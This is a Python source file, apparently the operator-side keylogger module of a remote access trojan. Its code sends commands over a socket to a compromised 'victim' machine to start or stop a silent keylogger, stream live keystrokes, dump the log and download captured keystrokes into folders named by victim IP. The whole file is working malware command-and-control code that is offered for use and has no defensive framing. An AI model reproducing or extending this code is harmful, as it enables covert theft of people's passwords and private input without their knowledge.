import threading
import time
import platform
import socket
import os
from datetime import date
from datetime import datetime

from .handler import Handler
from .other import XOREncryption
from .other import printColor
from .other import printAllTarget
from .other import printAllTargetAllInformation
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT, SPLIT 
from .management import CheckConn

class Keylogger:

    status_directTcp = True

    def __init__(self, session_nb):

        self.session_nb = session_nb
        Keylogger.status_directTcp = True


    def help(self):
        '''-h or --help'''
        printColor("help","""
-h or --help : Displays all session mode commands.

-ls or --list : Displays all clients with their information.

--listAll : displays all client information.

--direct : Records live keyboard keystrokes. 
 
--start : Starts a thread that launches the keylogger. 

--stop : Stop the keylogger.

--clean : Overwrites the file in which the keylogger saves the keyboard keys. 

--dump : displays the file in which the keylogger stores the keyboard keys.

--download : Download the file that contains the keyboard keys.

-b or --back : Back to menu.
""") 


    def recvThread(self):
        #receives the keyboard keys entered by the victim 

        while Keylogger.status_directTcp:

            keystroke = CheckConn().recvsafe(Handler.dict_conn[self.session_nb ][NB_SOCKET],64,False)
            if not (keystroke):
                #if error
                break
            else:
               printColor("successfully", keystroke,True)


    def directTcp(self):
        #Launches a thread to listen to keystrokes,
        #Send "\r\n" to signal the customer to stop the mod keylogger.
        printColor("information", "[?] Press CTRL+c to return to MOD KEYLOGGER.\n\n")
        Keylogger.status_directTcp = True
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:direct_tcp")):
            
            recv_thread = threading.Thread(target=self.recvThread)
            recv_thread.start()
            
            checker = True
            try:
                while checker:
                    time.sleep(120)
            except KeyboardInterrupt:
                checker = False
            
            Keylogger.status_directTcp = False
            recv_thread.join()
            CheckConn().sendsafe(self.session_nb, Handler.dict_conn[self.session_nb][NB_SOCKET], "\r\n")
            
            print("\n")
        else:
            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")

    
    def sendMod(self, data):
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], data)):
            #CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
            printColor("successfully", "\n[+] The mod has been sent.")
            CheckConn().recvmod(Handler.dict_conn[self.session_nb][NB_SOCKET])

        else:
            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")

    
    def dumpAllData(self):
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:dump_all")):
            CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
            #printColor("successfully", "[+] The mod has been sent.")
        else:
            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")


    def downloadFileTextThread(self):
        pass

    def downloadFileText(self):
        
        CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:download")

        buffer = 2048 #2048
        token = Handler.dict_conn[self.session_nb][NB_TOKEN] 
        ip_str = Handler.dict_conn[self.session_nb][NB_IP]
        now = datetime.now()
        
        if(platform.system() == "Linux"):
            folder = str(os.getcwd()) + "//" + "keylogger//" + str(ip_str)+ "-" + str(token)        
            name_of_file =  folder +"//"  + now.strftime("%b-%m-%Y_%H:%M") +".txt" #Sep-16-2019_14:55.txt

        else:
            folder = str(os.getcwd()) + "\\" + "keylogger\\" + str(ip_str)+ "-" + str(token)  
            name_of_file =  folder +"\\" + now.strftime("%b-%m-%Y_%H:%M") +".txt" #Sep-16-2019_14:55.txt
        print("name of file: ", name_of_file)

        #try to create the file.
        try:
            os.mkdir(folder)
        except FileExistsError:
            print("FileExistsError")
            pass
        except Exception as e:
            printColor("error","[-] Unable to create the folder to store log files.")
            return False    

        print("go to write")
        parameter = "w+b" #Write - will overwrite any existing content
        try:
            file = open(name_of_file, parameter)
        
        except Exception as e:
            printColor("error","[-] impossible to create the file.")
            print("2")
        else:
            print("file create..")
            
            if not (CheckConn().recvmod(Handler.dict_conn[self.session_nb][NB_SOCKET])):
                #if error
                print("la ?")
                pass
            else:
                #if not error
                printColor("information", "[?] The file is currently downloading...")

                while True:
                    Handler.dict_conn[self.session_nb][NB_SOCKET].settimeout(SOCK_TIMEOUT)
                    try:
                        data_encrypt = Handler.dict_conn[self.session_nb][NB_SOCKET].recv(buffer).decode("utf-16-le")
                        data_decrypt = XOREncryption(data_encrypt, Handler.PBKDF2_Key).encode("utf8")
                        if not(data_decrypt.decode()): #if empty
                            printColor("error","[-] Download the file that contains the keyboard keys.\n")
                            return None
                        
                    except ConnectionError as connerr:
                        printColor("error", "[-] error in recv data_encrypt: {}".format(str(connerr)))
                        break
                    except socket.timeout:
                        printColor("error","[-] The timeout was exceeded. \n")
                    else:
                        #write data decrypt in file.
                        if(data_decrypt.decode("utf8")== "\r\n"):
                            print("find")
                            break
                        try:
                            #print("write file")
                            #print("--->",data_decrypt,"<----")
                            file.write(data_decrypt)
                        except Exception as e:
                            printColor("error",e)
                            break

                printColor("successfully","[+] The file was successfully uploaded to the folder: "+ name_of_file)
                Handler.dict_conn[self.session_nb][NB_SOCKET].settimeout(None)



    def main(self):
        
        printColor("help","\n[?] Run -b or --back to return to the SESSION MOD.")
        printColor("help","[?] Run -h or --help to list the available commands.\n")
        checker = True                                   
        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker:
            terminal = str(input(str("keylogger")+">"))

            if terminal == "-h" or terminal == "--help":
                self.help()
            
            elif terminal == "-ls" or terminal == "--list":
                printAllTarget()

            elif terminal == "--listAll":
                printAllTargetAllInformation()

            elif terminal == "--direct":
                self.directTcp()

            elif terminal == "--start":
                self.sendMod("MOD_KEYLOGGER:start_silencious")
            
            elif terminal == "--stop":
                self.sendMod("MOD_KEYLOGGER:stop_silencious")

            elif terminal == "--clean":
                self.sendMod("MOD_KEYLOGGER:clean_silencious")

            elif terminal == "--dump":
                self.dumpAllData()
            
            elif terminal == "--download":
                self.downloadFileText()

            elif terminal == "-b" or terminal == "--back":
                checker = False
            
            else:
                pass

        